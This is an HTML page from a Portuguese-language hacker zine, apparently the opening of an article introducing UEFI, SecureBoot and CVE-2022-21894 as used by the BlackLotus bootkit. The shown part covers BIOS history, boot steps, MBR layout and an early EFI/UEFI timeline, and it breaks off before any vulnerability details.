<!DOCTYPE html>
<html>
<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Era uma vez uma Lótus Negra | TRAMOIA 0x1</title>
 <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
<div class="background"></div>
<div class="txtdiv"><pre id="artpre">
                                                                                                                               
    <g1>

                                                                   01<g1>
 <g2>░<g1>██<ww>▀<ww>█████<g1>    <g2>░<g1>██<ww>▀<ww>████<g1>     <g2>░<ww>▀<ww>███████<g1>     <g2>░<ww>██<g1>▌  <g2>░<ww>██<g1>     <g2>░<g1>█<ww>▀<ww>████<g1>     ██<g1>     <g2>░<ww>▀▀<ww>██████<g1>
  <g2>░░░<g1>██<g1>       <g2>░<g1>██<g2>░░░░<ww>█<g1>▌    <g2>░<g1>██<g2>░░░░<ww>██<g1>     <g2>░<g1>███<g1> <g2>░<g1>███<g1>    <g2>░<g1>██<g2>░░░░<ww>██<g1>   <g2>░<ww>██<g1>     <g2>░<g1>██<g2>░░░░<ww>██<g1>
    <g2>░<g1>██       <g2>░<g1>██   <g2>░<ww>█<g1>▌    <g2>░<g1>██   <g2>░<ww>██<g1>     <g2>░<g1>██<g1> ██<g2>░<g1>██<g1>    <g2>░<g1>██   <g2>░<g1>██<g1>   <g2>░<g1>▓█<g1>     <g2>░<g1>██   <g2>░<ww>██<g1>
    <g2>░<g1>██       <g2>░<g1>██████<ww>▀<g1>     <g2>░<g1>███████<g1>█     <g2>░<g1>██ 01<g2>░<g1>█<ww>▀<g1>    <g2>░<g1>██   <g2>░<g1>██   <g2>░<g1>█<ww>▀<g1>     <g2>░<g1>██████<ww>▀<ww>█<g1>
    <g2>░<g1>█·       <g2>░<g1>██   ▀█     <g2>░<g1>▓█   <g2>░<g1>██     <g2>░<g1>▓█   <g2>░<g1>██    <g2>░<g1>▓█   <g2>░<g1>██   <g2>░<g1>█▓     <g2>░<g1>▓█   <g2>░<g1>██
    <g2>░<g1>██       <g2>░<g1>██   <g2>░<g1>█     <g2>░<g1>█▓   <g2>░<g1>█▓     <g2>░<g1>▒    <g2>░<g1>█▓    <g2>░░<g1>▓   <g2>░<g1>▒▓   <g2>░<g1>█▓     <g2>░<g1>█▓   <g2>░<g1>█▓
    <g2>░<g1>▓▓       <g2>░<g1>▓▓   <g2>░<g1>▓▌    <g2>░<g1>▓▓   <g2>░<g1>▓▒     <g2>░<g1>▓▒   <g2>░<g1>▓▒    <g2>░<g1>▒░   <g2>░<g1>▓░   <g2>░<g1>▒▒     <g2>░<g1>▓▓   <g2>░<g1>▓▒
    <g2>░<g1>▒▓       <g2>░<g1>▓    <g2>░<g1>▓▌    <g2>░<g1>▓▒   <g2>░<g1>▓▓     <g2>░<g1>░▒   <g2>░░<g1>▓     <g2>░<g1>▒████░    <g2>░<g1>▓░     <g2>░<g1>▓▒   <g2>░░<g1>▓
    <g2>░<g1>▓<g2>░<g1>       <g2>░<g1>▒░   <g2>░<g1>░▌    <g2>░<g1>▒░                 <g2>░<g1>▓▒                <g2>░<g1>░▒     <g2>░<g1>▒░   <g2>░<g1>▓█
    <g2>░<g1>▒▓       <g2>░░<g1>▒          <g2>░<g1>▒                  <g2>░<g1>▒▓                <g2>░<g1>▒░     <g2>░<g1>▒·   <g2>░<g1>▓▒
    <g2>░<g1>▒·       <g2>░<g1>▒           <g2>░<g1>▒                  <g2>░<g1>▓                 <g2>░<g1>▒░     <g2>░<g1>▒▓   <g2>░<g1>░▓
    <g2>░▒<g1>▒                                        <g2>░<g1>▒░                  ░           <g2>░<g1>▒·
    <g2>░░<ww>░<g1>                                          ░                              <g2>░░<g1>▒
    ·░░                                                                         ░<g2>░░<g1>
    ·<g2>░<ww>░<g1><ww>  [+]--------------------------------------------------------------[+]   ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   | Era uma vez uma Lótus Negra:                                   |    <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   | Uma introdução à UEFI, SecureBoot e à CVE-2022-21894           |    <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>   | por Mr. Clusterfvck                                            |    ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  [+]--------------------------------------------------------------[+]   ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>                                 ..:..                                   ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                            ... ..-#=.. ....                             ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                         .-+... .:###=.. ...=-.                          <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                     .-##+:.. ..:#####-.. .:+##=..                       <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                   .-####*... ..*#####*:. ..+####=..                     <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>              .... .=######+...+#######+...=######=. ....                ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>        ..=-...... .=########::#########-:*#######=.. .....--..          <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>       ..=####+:....-#######+.*##########.=#######=....:+####=.          ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>        ..*#######+-.:*#####:-###########+:*####*-.:+#######*..          <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>       . ..*##########+::=#+.#############:+#=::+###########:..          <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>          .:#############*:.-#############=..*#############:..           ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>          ..-#############*:+#############+.##############-..            <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>           ..+############*:*#############*:#############+..             <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>            ..=###########*:*#############*:############+...             ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>           ....=##########*:+#############+.###########=...              <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>        ...-+*#:-##########=-#############=-##########-:**+-...          <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  .....=########-:#########*:+###########*.+#########:-########=.....    <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>   .:*############+.=########+.+#########*:=########=.+############+..   ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  ....:+###########=:=#######*.=#######+.+#######+.=###########+:.....   ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>      ....:+#########=.-*######-.*###*:-######*-.=########*+:....        <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>          .....:=+*####*=::-==++=..:..=++==-::=*####*+=:....             <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>             ..........:---:.............:--::..........                 <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                               ... . ..                                  <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Resumo:                                                                ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  Não muito tempo atrás lá em 2022, Zammis Clark/Wack0[1], um            <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  pesquisador focado em reversing e exploitdev de bootloaders no         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  Windows (pesquisando pelo nome dele você acha alguns acontecimentos    <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  interessantes ;]) lançou no github uma PoC da CVE-2022-21894,          ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  descoberta por ele. A CVE consiste em um bypass das proteções de       <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  SecureBoot implementadas na UEFI, permitindo que o processo de boot    ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  da máquina afetada possa ser manipulado.                               ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  Talvez o que o Wack0 não esperasse (ou esperasse, quem sabe ¯\_(ツ)_/¯)  <g2><g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  é que um trombadinha virtual, fã de visual novels e da                 ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Hasherezade[2], fosse utilizar seu exploit no desenvolvimento de um    <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  bootkit, dando vida assim ao BlackLotus. Menos ainda que esse          <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  malware funcionaria tão bem, que seria necessário uma nota de          <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  mitigação da NSA[3] pra essa ameaça. Quem diria que com um pouco de    ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  criatividade, um exploit pronto e maldade no coração você consegue     <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  ir tão longe ;].                                                       ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Esse simples artigo escrito pelo que vos fala, tem o intuito de        ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  introduzir o funcionamento da UEFI e seus internals de forma           <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  resumida, falar sobre o mecanismo de SecureBoot e trazer uma           <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  explicação da CVE-2022-21894 e como ela foi utilizada pelo             ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  BlackLotus durante sua cadeia de infecção.                             ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  [+]--------------------------------------------------------------[+]   ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   | 0. Em uma galáxia muito distante, nascia a BIOS                |    <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [+]--------------------------------------------------------------[+]   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  Dessa vez, muito tempo atrás lá em 1975, Gary Kildall conceitualiza    <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  a primeira BIOS (Bicho Ignorante Operando Sistema? Não! Basic Input    ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  Output System) com o intuito de ser uma implementação de plataforma    ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  de firmware boot, se mantendo como a principal ferramenta do mercado   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  por 30 anos. A BIOS tem o papel de agir como um “homem do meio”        <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  entre o hardware e o software (esse sendo normalmente o SO),           <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  cuidando do fluxo de dados entre essas partes e realizar as funções    ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  primárias de inicialização da máquina (também podem ser usada para     <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  fazer com que os dados fluam diretamente pra memória de alguns         <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  dispositivos, como GPUs), sendo acessada pelo processador em um chip   <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  EPROM (Erasable Programmable Read-Only Memory), um chip de memória     <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  não volátil que pode armazenar seus dados por até 20 anos.             ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Sua função básica pode ser resumida com a sigla ICTC (Identificar,     ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Configurar, Testar e Conectar), e durante o processo de                <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  inicialização da máquina, a BIOS faz as seguintes etapas:              ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   1. Power On Self Test (POST) - Testa o hardware do dispositivo e      ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   suas conexões para verificar se está tudo devidamente                 ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   conectado e funcionando, se tratam de testes elétricos para           ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   verificar se há algum mal funcionamento das peças (lembra             ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   quando você foi ligar seu computador e deu aquele beeeep logo         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>   antes de desligar novamente? isso é o POST avisando que alguma        ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   peça sua está com problema ou mal conectada);                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   2. CMOS Setup - Checa informação em uma pequena quantidade de RAM     ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   (64 bytes) localizada na CMOS (Complementary Metal-Oxide              ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   Semiconductor) para fornecer informações detalhadas sobre seu         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   sistema (como data e hora do sistema, quantidade e tipos de           <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>   drives, memória interna,...);                                         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>   3. Execução de BIOS de outros dispositivos - Ela executa a BIOS       <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   de outros dispositivos (como GPUs por exemplo, que podem ter          <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>   sua própria BIOS);                                                    <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>   4. Identifica o dispositivo de boot - Baseado nas configurações       ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   captadas durante o CMOS Setup, a BIOS identifica os bootable          <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   devices da máquina e sua ordem de sequência;                          <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>   5. Identificação e carregamento do MBR na RAM - A BIOS procura        ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   pelo MBR (Master Boot Record) no primeiro setor do dispositivo        <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   de boot (offset físico 0) e então carrega o SO na RAM, baseado        ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   nas configurações do bootstrap code do MBR, inicializando o           <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   sistema operacional da máquina.                                       ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Abaixo tem um exemplo da estrutura de um MBR genérico:                 <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  +-------------+---------------------------------+------------------+   <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  | Endereço    | Descrição                       | Tamanho (bytes)  |   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  +-------------+---------------------------------+------------------+   <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |             |                                 |                  |   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  |             |                                 |                  |   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |             |                                 |                  |   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  |             |                                 |                  |   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |             |                                 |                  |   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  |   0x0000    | Bootstrap Code Area             | 446              |   <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  |             |                                 |                  |   <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  |             |                                 |                  |   <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  |             |                                 |                  |   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |             |                                 |                  |   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |             |                                 |                  |   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  |             |                                 |                  |   <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  +-------------+-------------------+-------------+------------------+   <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  | 0x01BE      | Partition Entry 1 |             | 16               |   ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +-------------+-------------------+             |------------------+   ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  | 0x01CE      | Partition Entry 2 | Partition   | 16               |   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |-------------+-------------------+ Table       |------------------+   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  | 0x01DE      | Partition Entry 3 |             | 16               |   <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  |-------------+-------------------+             |------------------+   <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  | 0x01EE      | Partition Entry 4 |             | 16               |   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |-------------+-------------------+-------------+------------------+   <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  | 0x01FE      | 0x55              | Boot        |                  |   ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |-------------+-------------------+ Signature   | 2                |   ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  | 0x01FF      | 0xAA              |             |                  |   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  +-------------+-------------------+-----+-------+------------------+   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>            | Tamanho total: 512 bytes |                                 ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>            +--------------------------+                                 <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  Vale dizer que existem outros tipos de MBR (como AAP MBR ou NEWLDR     <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  MBR por exemplo) com adições de outras entradas, verificações e até    ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  divisões da área do bootstrap code, mas de forma simples, esse         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  exemplo é um esqueleto da grande maioria dos MBRs usados desde         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  antigamente até hoje em dia. Mais na frente a gente vai ver a          <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  diferença entre MBR e GPT, então guardem essa estrutura na cabeça      ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  até lá ;].                                                             ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [*]-----------------------------------[*]                              ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   | 0.1 Mas nem tudo são flores…        |                               ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [*]-----------------------------------[*]                              ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  Conforme o tempo foi passando, a BIOS começou a apresentar problemas   <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  para a época:                                                          ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   - Suporte de drives limitado: Devido à limitações da época em         <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   que foi desenvolvida, a BIOS suportava somente drives de até          ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   2.2TB;                                                                ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   - Suporte de drivers guardado em ROM: Fazer atualizações dos          <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>   drivers da BIOS era de fato muito trabalhoso devido à seu             <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   suporte ser guardado em uma Read-Only Memory, o que                   ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   dificultava a experiência do usuário;                                 <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>   - Rodava em modo 16-bits: Por conta de seu funcionamento em           <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   16-bits, a interface gráfica era extremamente limitada e              ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   dependia de informações guardadas em outras memórias para             ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   mostrar dados do sistema (como o dia e hora por exemplo);             <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   - Escrita totalmente em ASM: Por ser desenvolvida completamente       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   em Assembly, fazer atualizações e manter o código era                 ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   extremamente trabalhoso e custoso para as fabricantes;                <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>   - Adaptada para recursos obsoletos da arquitetura x86: Por mais       ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   que a BIOS fosse atualizada, suas adaptações principais já não        ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   serviam tanto uma vez que foram pensadas em recursos obsoletos        <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>   da arquitetura x86.                                                   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  Logo, houve uma necessidade por parte das OEMs (Original Equipment     <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  Manufacturers) de melhorar a BIOS para poder suportar as novas         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  tecnologias que estavam popularizando-se no mercado, foi então que     <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  ao final de 1990, a Intel decidiu iniciar um projeto sobre um novo     ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  sistema que viria a substituir a BIOS como conhecemos: a EFI.          <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  [+]--------------------------------------------------------------[+]   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   | 1. E então veio outra explosão… UEFI                           |    <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  [+]--------------------------------------------------------------[+]   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  A EFI (Extensible Firmware Interface) nasceu como uma ideia da Intel   <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  para suceder a BIOS na era moderna, focando principalmente em          <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  melhorar os principais problemas que a BIOS começou a apresentar com   <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  o tempo. Desde o início de sua criação, a EFI sofreu diversas          ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  alterações com o tempo, já começando pelo seu nome, uma vez que a      <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Intel decide se juntar com outras grandes empresas em 2005 para        <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  fundar o UEFI Forum, ganhando assim a letra U de “Unified” na sua      <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  sigla. A linha do tempo abaixo fala um pouco sobre essas mudanças e    <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  atualizações desde a década de 70 até eventos mais recentes:           ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>              1975                             1990                      <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>        Criação da BIOS                Mudanças na tecnologia            ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  |&gt; Idealizada por Gary     |      |&gt; 32-bit protected mode   |         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  | Kildall                  |      |&gt; CPUs mais rápidas       |         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  |&gt; Principal implementação |      |&gt; Mais memória            |         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | de firmware boot por     | ---&gt; |&gt; Novos dispositivos      |         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | 30 anos                  |      |&gt; Complexidade máxima da  |         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  |&gt; Closed-source e         |      | BIOS atingida            |         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  | distribuída em binários  |      |                          |         <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>              _________________________________________|                 <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>             ↓                                                           <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>            1998                                2005                     <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>     Desenvolvimento da EFI              Nascimento da UEFI              ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  |&gt; Intel começa a          |      |&gt; Última especificação da |         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  | trabalhar na EFI para    |      | EFI (1.10)               |         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  | substituir a BIOS nas    |      |&gt; Criação do UEFI Forum   |         ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  | plataformas Intel-HP     | ---&gt; |&gt; Especificação da EFI é  |         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  | Itanium                  |      | contribuída ao Forum     |         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  |&gt; Sua documentação era    |      | pela Intel               |         ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | restrita à parceiros     |      |&gt; Criação da UEFI         |         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>              _________________________________________|                 <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>             ↓                                                           ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>            2006                                2007                     ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>          UEFI 2.0                            UEFI 2.1                   <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |&gt; Introdução de mecanismos|      |&gt; Autenticação via rede   |         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  | de criptografia e        |      |&gt; Atualização de          |         <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  | segurança                |      |Arquitetura da UI         |         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |&gt; Versão 1.0 da Platform  |----&gt; |                          |         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  | Initialization é         |      |                          |         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  | lançada                  |      |                          |         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  |                          |      |                          |         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  +--------------------------+      +--------------------------+         ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>              _________________________________________|                 <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>             ↓                                                           ·<g2>░<ww>░<g1><ww>
